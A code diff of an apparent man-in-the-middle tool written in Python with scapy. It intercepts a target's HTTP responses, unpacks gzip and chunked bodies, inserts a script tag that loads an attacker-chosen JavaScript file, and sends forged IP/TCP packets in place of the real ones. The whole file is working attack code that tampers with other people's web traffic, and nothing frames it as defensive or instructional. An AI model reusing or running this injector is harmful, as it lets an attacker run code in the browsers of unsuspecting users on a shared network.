@@ -13,14 +13,8 @@
 
 #UPDATE: todo era problema del kernel de ubuntu version 4.15
 
-#wikia.com/fandom/ a veces no funciona. no he comprobado los paquetes que llegan, pero parece que en los que
-#se envian hay un \r\d\r\d en mitad del load, y no esta mi codigo. probablemente eso haga que no funcione.
-#igual el codigo se esta añadiendo mal, o el chunked length esta cambiandose mal
 
 
-#www.badmintonarmilla.es --> chunked y gzip a la vez
-#pensar que hacer en los casos en los que está esto y no se puede descomprimir gzip
-#pensar si merece la pena sniffear la transaccion entera
 
 import threading
 import gzip
@@ -30,97 +24,59 @@ from src import packet_utilities
 from src.log import log
 
 class Spoofed_HTTP_Load(bytes):
-    ###OLD
-    # ~ spoof_load = real_packet.load
-        
-    # ~ spoof_load = self._increase_length_attribute(spoof_load)
-    
-    # ~ spoof_load_s = spoof_load.split(b"\r\n\r\n")
-    
-    # ~ content_encoding = None
-    # ~ if b"Content-Encoding: gzip" in spoof_load_s[0]:
-        # ~ content_encoding = "gzip"
-        # ~ print("DETECTED GZIP ENCODING")
-        # ~ try:
-            # ~ spoof_load_s[1] = gzip.decompress(spoof_load_s[1])
-        # ~ except Exception as err:
-            # ~ print("ERROR DECOMPRESSING:", err)
-            
-    # ~ transfer_encoding = None
-    # ~ if b"Transfer-Encoding: chunked" in spoof_load_s[0]:
-        # ~ transfer_encoding = "chunked"
-        # ~ print("DETECTED CHUNKED ENCODING")
-    
-    # ~ if transfer_encoding == "chunked":
-        # ~ spoof_load_s[1] = self._add_injected_code_to_chunked_load(spoof_load_s[1])
-    # ~ else:
-        # ~ spoof_load_s[1] = self.injected_code + spoof_load_s[1]
-
-    # ~ if content_encoding == "gzip":
-        # ~ spoof_load_s[1] = gzip.compress(spoof_load_s[1])
-    
-    # ~ spoof_load = b"\r\n\r\n".join(spoof_load_s)
-
-    # ~ spoof_load = self._shorten_load_if_necessary(spoof_load, len(real_packet.load))
-    
-    
-    ###NEW
     def _gzip_action_if_needed(self, load, action):
         if action == "compress": action_f = gzip.compress
         elif action == "decompress": action_f = gzip.decompress
         else: print("ERROR UNKNOWN ACTION", action); return
         
         if "gzip" in self.content_encoding_header:
-            try:
-                load = action_f(load)
-            except Exception as err:
-                #Sometimes decompressing fails, because i think we can not decompress a part of
-                #a gzip string. However, this doesnt seem a problem. The injected code is
-                #attached to the compressed packet load, and then it is compressed.
-                #print("ERROR WITH GZIP ACTION",action.upper(),":", err)
-                log.js.error("gzip", action=action.upper(), err=err)
-                #print(load.decode("utf-8", "ignore"))
-                print(len(load))
-                raise
-        
+            load = action_f(load)
         return load
         
         
-    def _add_injected_code(self, load):
-        if "chunked" in self.transfer_encoding_header:
-            chunk_start = load.find(b"\r\n")
+    # ~ def _add_injected_code(self, load):
+        # ~ if "chunked" in self.transfer_encoding_header:
+            # ~ chunk_start = load.find(b"\r\n")
             
-            if chunk_start == -1:
-                print("CHUNK START NOT FOUND, PROBABLY EMPTY PACKET. THIS SHOULD NOT BE HAPPENING BECAUSE IM NOT HANDLING EMPYT PACKETS ANYMORE.")
-                print("Returning", (self.injected_code + load).decode())
-                return self.injected_code + load 
+            # ~ if chunk_start == -1:
+                # ~ print("CHUNK START NOT FOUND, PROBABLY EMPTY PACKET. THIS SHOULD NOT BE HAPPENING BECAUSE IM NOT HANDLING EMPYT PACKETS ANYMORE.")
+                # ~ print("Returning", (self.injected_code + load).decode())
+                # ~ return self.injected_code + load 
 
-            bytes_chunk_length = load[:chunk_start] #chunk length is said before the beggining of the chunk, in the first bytes
-            int_chunk_length = int(bytes_chunk_length, 16) #paso la longitud de bytes de base 16 a int de base 10
+            # ~ bytes_chunk_length = load[:chunk_start] #chunk length is said before the beggining of the chunk, in the first bytes
+            # ~ int_chunk_length = int(bytes_chunk_length, 16) 
+            # ~ new_int_chunk_length = int_chunk_length + len(self.injected_code) #le sumo la longitud del codigo
+            # ~ new_bytes_chunk_length = hex(new_int_chunk_length)[2:].encode() #paso la longitud de int de base 10 a bytes de base 16. lo del 2 es para quitar el '0x'
+            
+            # ~ #print(type(bytes_chunk_length), type(new_bytes_chunk_length), type(self.injected_code))
+            # ~ load = load.replace(bytes_chunk_length + b"\r\n", new_bytes_chunk_length + b"\r\n" + self.injected_code)
+            # ~ #print("CHUNK LENGTH:", int_chunk_length)
+            # ~ #print("ORIGINAL LOAD:", load)
+            # ~ #print("LOAD REPLACED:", new_load)
+        # ~ else:
+            # ~ load = self.injected_code + load
+            
+        # ~ return load
+        
+        
+    def _update_and_add_chunk_length_if_needed(self, load, b_chunk_length):
+        if b_chunk_length:
+            int_chunk_length = int(b_chunk_length[:-2].decode(), 16) #paso de bytes de base 16 a int de base 10
             new_int_chunk_length = int_chunk_length + len(self.injected_code) #le sumo la longitud del codigo
-            new_bytes_chunk_length = hex(new_int_chunk_length)[2:].encode() #paso la longitud de int de base 10 a bytes de base 16. lo del 2 es para quitar el '0x'
-            
-            #print(type(bytes_chunk_length), type(new_bytes_chunk_length), type(self.injected_code))
-            load = load.replace(bytes_chunk_length + b"\r\n", new_bytes_chunk_length + b"\r\n" + self.injected_code)
-            # ~ print("CHUNK LENGTH:", int_chunk_length)
-            # ~ print("ORIGINAL LOAD:", load)
-            # ~ print("LOAD REPLACED:", new_load)
-        else:
-            load = self.injected_code + load
-            
+            new_b_chunk_length = hex(new_int_chunk_length)[2:].encode() + b"\r\n" #paso la longitud de int de base 10 a bytes de base 16. lo del 2 es para quitar el '0x'
+            return new_b_chunk_length + load
         return load
+    
     
     def _remove_header_attribute_if_needed(self, attr_name, load, length_needed):
         if len(load) > length_needed:
             new_load = load
             attr_all = packet_utilities.get_header_attribute_from_http_load(attr_name, new_load)
-            if not attr_all:
-                # ~ print("Attribute", attr_name, "not found")
+            if not attr_all: #the attribute is not in the load
                 return load
             
             if len(load) - len(attr_all) > length_needed: #si a pesar de quitarle el atributo sigue siendo muy largo, se lo quito entero
                 new_load = new_load.replace(attr_all, b"", 1)
-                # ~ print("Attribute", attr_name, "removed completely to save", len(attr_all), "bytes.")
             else: #quito la longitud adecuada para llegar al tamaño
                 remove = attr_all[-2-(len(load)-length_needed):-2] #la parte del atributo que quito
                 
@@ -139,7 +95,6 @@ class Spoofed_HTTP_Load(bytes):
 
                     
                 new_load = new_load.replace(remove, b"", 1)
-                # ~ print("Attribute", attr_name, "removed partialy to save", len(remove), "bytes. Original attribute length:", len(attr_all))
             return new_load
         else:
             return load
@@ -154,54 +109,68 @@ class Spoofed_HTTP_Load(bytes):
         
         if len(new_load) > length_needed:
             #This doesnt seem a problem.
-            #print("[ERROR] Despite having removed attributes, length was reduced from", len(load), "to", len(new_load), "and not to", length_needed, "(" + str(len(new_load)-length_needed) + " more bytes than intended)")
             log.js.warning("exceeded_len", len_load=len(load), len_new_load = len(new_load), len_needed = length_needed, len_difference = str(len(new_load)-length_needed))
-            # ~ print(new_load.decode("utf-8", "ignore"))
         return new_load
                 
     
     def _increase_length_header_if_needed(self, load):
-        
-        first_pos = load.find(b"Content-Length: ")
-        if first_pos != -1:
-            last_pos = load.find(b"\r\n", first_pos)
-            length_all = load[first_pos:last_pos]
-            length_n = load[first_pos+16:last_pos]
-            #print(length_n)
-            new_length = b"Content-Length: " + str(int(length_n)+len(self.injected_code)).encode("utf-8")
+        length_all = packet_utilities.get_header_attribute_from_http_load("Content-Length", load)
+        if length_all:
+            length_n = length_all[16:]
+            new_length = b"Content-Length: " + str(int(length_n)+len(self.injected_code)).encode("utf-8") + b"\r\n"
             result = load.replace(length_all, new_length, 1)
             return result
         return load
         
-        
+    def _remove_chunk_length_if_needed(self, load):
+        if "chunked" in self.transfer_encoding_header:
+            pos = load.find(b"\r\n")
+            chunk_len = load[:pos+2]
+            new_load = load.replace(chunk_len, b"")
+            return new_load, chunk_len
+        return load, b""
+    
     def __new__(self, real_load, injected_code):
+        #le quito chunked
+        #decomprimo
+        #añado codigo
+        #comprimo
+        #añado chunked actualizado
+        #quito headers para reducir longitud
+        #actualizo el header de la longitud
+        
         spoof_load = real_load
         
         self.injected_code = injected_code
         
         self.content_encoding_header = packet_utilities.get_header_attribute_from_http_load("Content-Encoding", spoof_load).decode()
         self.transfer_encoding_header = packet_utilities.get_header_attribute_from_http_load("Transfer-Encoding", spoof_load).decode()
-        self.decompressed = False if self.content_encoding_header else True
             
         spoof_load = spoof_load.split(b"\r\n\r\n")
         
+        spoof_load[1], chunk_length = self._remove_chunk_length_if_needed(self, spoof_load[1]) #le quito chunked
         try:
-            spoof_load[1] = self._gzip_action_if_needed(self, spoof_load[1], "decompress")
-            self.decompressed = True
+            spoof_load[1] = self._gzip_action_if_needed(self, spoof_load[1], "decompress") #descomprimo
         except Exception as err:
-            print(self.decompressed)
+            #Sometimes decompressing fails, because i think we can not decompress a part of
+            #a gzip string. In this cases, the packet is not spoofed and the real packet is forwarded.
+            #Same for any other unexpected error.
+            raise
+
+                
+        spoof_load[1] = self.injected_code + spoof_load[1] #añado codigo
         
         
-        spoof_load[1] = self._add_injected_code(self, spoof_load[1])
+        spoof_load[1] = self._gzip_action_if_needed(self, spoof_load[1], "compress") #comprimo
         
-        
-        spoof_load[1] = self._gzip_action_if_needed(self, spoof_load[1], "compress")
+        spoof_load[1] = self._update_and_add_chunk_length_if_needed(self, spoof_load[1], chunk_length) #añado chunked actualizado
         
         spoof_load = b"\r\n\r\n".join(spoof_load)
         
         
-        spoof_load = self._shorten_load_if_needed(self, spoof_load, len(real_load))
-        spoof_load = self._increase_length_header_if_needed(self, spoof_load)
+        spoof_load = self._shorten_load_if_needed(self, spoof_load, len(real_load)) #quito headers para reducir longitud
+        spoof_load = self._increase_length_header_if_needed(self, spoof_load) #actualizo el header de la longitud
+        
         
         
         return super().__new__(self, spoof_load)
@@ -216,8 +185,6 @@ class JS_Injecter(threading.Thread):
         self.target = target
         self.timeout = timeout
         self.injected_code = b"<script src=\"" + file_loc.encode("utf-8") + b"\"></script>\n"
-        #b"<script src=\"" + file_loc.encode("utf-8") + b"\" type=\"text/javascript\"></script>\n"
-        #<script src="xxx" type="text/javascript"></script>
 
         self.handled_packets = []
           
@@ -233,30 +200,22 @@ class JS_Injecter(threading.Thread):
         return result
         
     def _send_spoofed_packet(self, real_packet):
-        spoof_load = Spoofed_HTTP_Load(real_packet.load, self.injected_code)
-
+        try:
+            spoof_load = Spoofed_HTTP_Load(real_packet.load, self.injected_code)
+        except EOFError:
+            log.js.warning("gzip")
+            self._forward_http_packet(real_packet)
+            return
+        except Exception as err:
+            log.error("js", "Unexpected error creating spoofed http load:", type(err), err)
+            self._forward_http_packet(real_packet)
+            return
         
         spoof_packet = IP(src=real_packet["IP"].src, dst=real_packet["IP"].dst, flags=real_packet["IP"].flags, id=real_packet["IP"].id)/ \
                        TCP(sport=real_packet["TCP"].sport, dport=real_packet["TCP"].dport, seq=real_packet["TCP"].seq, 
                        ack=real_packet["TCP"].ack, flags=real_packet["TCP"].flags, window=real_packet["TCP"].window, options=real_packet["TCP"].options)/ \
                        Raw(load=spoof_load)
-
-        # ~ print("[BEFORE]:")
-        # ~ print(real_packet.load.decode("utf-8","ignore"))
-        # ~ #real_packet.show()
-        # ~ print("\n[AFTER]:")
-        # ~ print(spoof_load.decode("utf-8","ignore"))
-        # ~ #spoof_packet.show2()
         
-        #print("Spoof load length:", len(spoof_load), "Real load length:", len(real_packet.load))
-        # ~ if len(spoof_load) > 2000:
-            # ~ spoof_packet.show()
-        # ~ print(len(spoof_packet["IP"]), len(real_packet["IP"]))
-        # ~ print(len(spoof_packet["TCP"]), len(real_packet["TCP"]))
-        # ~ print(len(spoof_packet["Raw"]), len(real_packet["Raw"]))
-        # print("Spoof packet length:", len(spoof_packet), "Real packet length:", len(real_packet))
-        
-        spoof_packet["Raw"].remove_payload()
         send(spoof_packet, verbose=0)
         self._add_handled_packet(spoof_packet)
         log.js.info("packet_handled", len_spoof_load = len(spoof_load), len_real_load = len(real_packet.load))
